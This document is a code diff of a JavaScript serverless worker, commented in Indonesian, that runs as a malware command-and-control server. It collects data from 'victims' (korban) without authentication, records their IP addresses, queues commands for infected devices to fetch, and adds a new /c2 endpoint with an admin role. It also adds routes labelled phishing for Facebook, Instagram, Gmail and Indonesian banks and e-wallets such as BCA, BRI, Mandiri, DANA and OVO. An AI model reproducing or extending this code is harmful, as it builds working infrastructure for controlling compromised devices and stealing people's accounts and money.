@@ -7,6 +7,7 @@
 // KONFIGURASI
 // ============================================================
 const MAX_DATA = 5000;
+const WS_PING_INTERVAL = 30000; // 30 detik
 
 // ============================================================
 // CORS HEADERS
@@ -14,7 +15,7 @@ const MAX_DATA = 5000;
 const CORS = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-  'Access-Control-Allow-Headers': 'Content-Type',
+  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-API-Key, X-Password',
   'Access-Control-Max-Age': '86400',
 };
 
@@ -31,15 +32,26 @@ function jsonResponse(data, status = 200) {
   });
 }
 
+function htmlResponse(html, status = 200) {
+  return new Response(html, {
+    status,
+    headers: {
+      'Content-Type': 'text/html;charset=UTF-8',
+      ...CORS,
+    },
+  });
+}
+
 // ============================================================
 // 🔥 AUTHENTICATION - HANYA 1 PASSWORD!
 // ============================================================
 function isAuthenticated(request, env) {
   const url = new URL(request.url);
   const key = url.searchParams.get('key') || 
+              url.searchParams.get('password') ||
               request.headers.get('X-API-Key') || 
               request.headers.get('Authorization')?.replace('Bearer ', '');
-  return key === env.PASSWORD;  // 🔥 HANYA 1 PASSWORD!
+  return key === env.PASSWORD;
 }
 
 // ============================================================
@@ -50,6 +62,7 @@ export default {
     const url = new URL(request.url);
     const method = request.method;
     
+    // ✅ CORS OPTIONS
     if (method === 'OPTIONS') {
       return new Response(null, { headers: CORS });
     }
@@ -61,7 +74,7 @@ export default {
       const password = env.PASSWORD || '';
       return jsonResponse({
         status: 'ok',
-        password: password,  // 🔥 1 PASSWORD!
+        password: password,
         timestamp: Date.now()
       });
     }
@@ -74,14 +87,21 @@ export default {
     }
 
     // ============================================================
-    // 🔥 GET /data?type=perintah&password=xxx - SERVER → KORBAN (PAKAI PASSWORD!)
+    // 🔥 GET /data - DASHBOARD AMBIL DATA / KORBAN CEK PERINTAH
     // ============================================================
     if (url.pathname === '/data' && method === 'GET') {
       return await handleGetData(request, env);
     }
 
     // ============================================================
-    // 🔥 WEBSOCKET /ws - PAKAI PASSWORD!
+    // 🔥 POST /c2 - DASHBOARD KIRIM PERINTAH
+    // ============================================================
+    if (url.pathname === '/c2' && method === 'POST') {
+      return await handleC2(request, env);
+    }
+
+    // ============================================================
+    // 🔥 WEBSOCKET /ws
     // ============================================================
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
@@ -101,10 +121,36 @@ export default {
         endpoints: {
           get_password: '/get-password',
           post_data: 'POST /data',
+          get_data: 'GET /data?key=xxx',
           get_command: 'GET /data?type=perintah&password=xxx',
+          post_c2: 'POST /c2?key=xxx',
           websocket: 'wss://' + url.host + '/ws'
         }
       });
+    }
+
+    // ============================================================
+    // 🔥 ROUTE /fb, /ig, /dana, dll (PHISHING)
+    // ============================================================
+    if (method === 'GET') {
+      const phishingRoutes = {
+        '/fb': 'https://www.facebook.com/login',
+        '/ig': 'https://www.instagram.com/accounts/login',
+        '/bri': 'https://ib.bri.co.id',
+        '/dana': 'https://www.dana.id',
+        '/gopay': 'https://www.gojek.com',
+        '/ovo': 'https://www.ovo.id',
+        '/mandiri': 'https://ib.bankmandiri.co.id',
+        '/bca': 'https://m.klikbca.com',
+        '/shopee': 'https://shopee.co.id/login',
+        '/tokped': 'https://www.tokopedia.com',
+        '/jenius': 'https://www.jenius.com',
+        '/gmail': 'https://accounts.google.com/signin'
+      };
+      
+      if (phishingRoutes[url.pathname]) {
+        return Response.redirect(phishingRoutes[url.pathname], 302);
+      }
     }
 
     // 404
@@ -121,21 +167,6 @@ async function handlePostData(request, env) {
 
     if (!body || typeof body !== 'object') {
       return jsonResponse({ error: 'Invalid request body' }, 400);
-    }
-
-    // 🔥 C2 COMMAND (DARI DASHBOARD) - PAKAI PASSWORD!
-    const url = new URL(request.url);
-    const key = url.searchParams.get('key');
-    if (key === env.PASSWORD && (body.sumber === 'c2_command' || body.type === 'c2_command')) {
-      const cmdData = body.data || body;
-      cmdData.timestamp = Date.now();
-      cmdData.status = 'pending';
-      await env.DATA.put('perintah', JSON.stringify(cmdData));
-      return jsonResponse({
-        status: 'ok',
-        type: 'c2',
-        command: cmdData.aksi
-      });
     }
 
     // 🔥 DATA DARI KORBAN - TANPA PASSWORD!
@@ -168,18 +199,18 @@ async function handlePostData(request, env) {
 }
 
 // ============================================================
-// 🔥 HANDLER: GET /data (SERVER → KORBAN - PAKAI PASSWORD!)
+// 🔥 HANDLER: GET /data (SERVER → KORBAN / DASHBOARD)
 // ============================================================
 async function handleGetData(request, env) {
   const url = new URL(request.url);
   const type = url.searchParams.get('type');
   const password = url.searchParams.get('password');
+  const key = url.searchParams.get('key');
 
-  // 🔥 AMBIL PERINTAH C2 (PAKAI PASSWORD!)
+  // 🔥 AMBIL PERINTAH C2 (UNTUK KORBAN - PAKAI PASSWORD!)
   if (type === 'perintah') {
     const correctPassword = env.PASSWORD || '';
 
-    // 🔥 VERIFIKASI PASSWORD!
     if (password !== correctPassword) {
       return jsonResponse({
         status: 'error',
@@ -193,9 +224,8 @@ async function handleGetData(request, env) {
         const cmd = JSON.parse(perintah);
         await env.DATA.delete('perintah');
 
-        // 🔥 KIRIM PERINTAH + PASSWORD (UNTUK VERIFIKASI KORBAN)
         return jsonResponse({
-          aksi: cmd.aksi,
+          aksi: cmd.aksi || cmd.command || 'unknown',
           params: cmd.params || {},
           password: correctPassword,
           timestamp: Date.now()
@@ -207,7 +237,7 @@ async function handleGetData(request, env) {
     }
   }
 
-  // 🔥 GET BIASA - LIHAT DATA (PAKAI PASSWORD!)
+  // 🔥 AMBIL DATA UNTUK DASHBOARD (PAKAI PASSWORD!)
   if (!isAuthenticated(request, env)) {
     return jsonResponse({ error: 'Access Denied' }, 403);
   }
@@ -216,17 +246,20 @@ async function handleGetData(request, env) {
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
 
+    // Filter by source
     const source = url.searchParams.get('source');
     if (source) {
       data = data.filter(item => item.sumber === source);
     }
 
+    // Search
     const search = url.searchParams.get('search');
     if (search) {
       const s = search.toLowerCase();
       data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
     }
 
+    // Sort
     const sort = url.searchParams.get('sort') || 'newest';
     if (sort === 'newest') {
       data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
@@ -234,15 +267,55 @@ async function handleGetData(request, env) {
       data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
     }
 
-    return jsonResponse(data);
+    // Limit
+    const limit = parseInt(url.searchParams.get('limit')) || 500;
+    if (data.length > limit) {
+      data = data.slice(0, limit);
+    }
+
+    return jsonResponse({
+      status: 'ok',
+      total: data.length,
+      data: data
+    });
 
   } catch (e) {
-    return jsonResponse([]);
+    return jsonResponse({ error: e.message }, 500);
   }
 }
 
 // ============================================================
-// 🔥 HANDLER: WEBSOCKET /ws (PAKAI PASSWORD!)
+// 🔥 HANDLER: POST /c2 (DASHBOARD → SERVER - PAKAI PASSWORD!)
+// ============================================================
+async function handleC2(request, env) {
+  if (!isAuthenticated(request, env)) {
+    return jsonResponse({ error: 'Access Denied' }, 403);
+  }
+
+  try {
+    const body = await request.json();
+    const cmd = {
+      aksi: body.command || body.aksi || 'unknown',
+      params: body.params || {},
+      timestamp: Date.now(),
+      status: 'pending'
+    };
+
+    await env.DATA.put('perintah', JSON.stringify(cmd));
+
+    return jsonResponse({
+      status: 'ok',
+      command: cmd.aksi,
+      timestamp: cmd.timestamp
+    });
+
+  } catch (error) {
+    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
+  }
+}
+
+// ============================================================
+// 🔥 HANDLER: WEBSOCKET /ws
 // ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
@@ -256,6 +329,19 @@ async function handleWebSocket(request, env) {
 
   let authenticated = false;
   let deviceId = 'unknown';
+  let pingInterval = null;
+
+  // 🔥 PING INTERVAL (KEEP-ALIVE)
+  pingInterval = setInterval(() => {
+    try {
+      server.send(JSON.stringify({
+        type: 'ping',
+        timestamp: Date.now()
+      }));
+    } catch (e) {
+      clearInterval(pingInterval);
+    }
+  }, WS_PING_INTERVAL);
 
   server.addEventListener('message', async (event) => {
     try {
@@ -265,7 +351,7 @@ async function handleWebSocket(request, env) {
       // 🔥 AUTHENTIKASI - HANYA 1 PASSWORD!
       // ============================================================
       if (data.type === 'auth') {
-        const key = data.key || '';
+        const key = data.key || data.password || '';
         const correctPassword = env.PASSWORD || '';
 
         if (key === correctPassword) {
@@ -273,9 +359,9 @@ async function handleWebSocket(request, env) {
           deviceId = data.deviceId || 'unknown';
           server.send(JSON.stringify({
             type: 'auth_success',
-            role: 'device'
+            role: data.role === 'admin' ? 'admin' : 'device',
+            timestamp: Date.now()
           }));
-          console.log('✅ WS Authenticated:', deviceId);
         } else {
           server.send(JSON.stringify({ type: 'auth_failed' }));
           server.close(1008, 'Auth failed');
@@ -283,9 +369,16 @@ async function handleWebSocket(request, env) {
         return;
       }
 
-      // 🔥 JIKA BELUM AUTH, TOLAK SEMUA PERMINTAAN
+      // 🔥 JIKA BELUM AUTH, TOLAK
       if (!authenticated) {
         server.close(1008, 'Unauthorized');
+        return;
+      }
+
+      // ============================================================
+      // 🔥 PONG (RESPON PING)
+      // ============================================================
+      if (data.type === 'pong') {
         return;
       }
 
@@ -293,16 +386,15 @@ async function handleWebSocket(request, env) {
       // 🔥 COMMAND DARI DASHBOARD → Simpan perintah
       // ============================================================
       if (data.type === 'command') {
-        const correctPassword = env.PASSWORD || '';
         const cmdData = data.command || {};
         cmdData.timestamp = Date.now();
         cmdData.status = 'pending';
-        cmdData.password = correctPassword;
         
         await env.DATA.put('perintah', JSON.stringify(cmdData));
         server.send(JSON.stringify({
           type: 'command_received',
-          command: cmdData.aksi || 'unknown'
+          command: cmdData.aksi || 'unknown',
+          timestamp: Date.now()
         }));
         return;
       }
@@ -318,7 +410,8 @@ async function handleWebSocket(request, env) {
           waktu: new Date().toISOString(),
           sumber: data.type === 'result' ? 'c2_result' : 'websocket',
           data: data.data || data,
-          deviceId: deviceId
+          deviceId: deviceId,
+          ip: request.headers.get('CF-Connecting-IP') || 'unknown'
         });
 
         if (allData.length > MAX_DATA) {
@@ -326,7 +419,7 @@ async function handleWebSocket(request, env) {
         }
 
         await env.DATA.put('data', JSON.stringify(allData));
-        server.send(JSON.stringify({ type: 'saved' }));
+        server.send(JSON.stringify({ type: 'saved', timestamp: Date.now() }));
         return;
       }
 
@@ -350,7 +443,7 @@ async function handleWebSocket(request, env) {
   });
 
   server.addEventListener('close', () => {
-    console.log('❌ WS Closed:', deviceId);
+    clearInterval(pingInterval);
   });
 
   return new Response(null, {
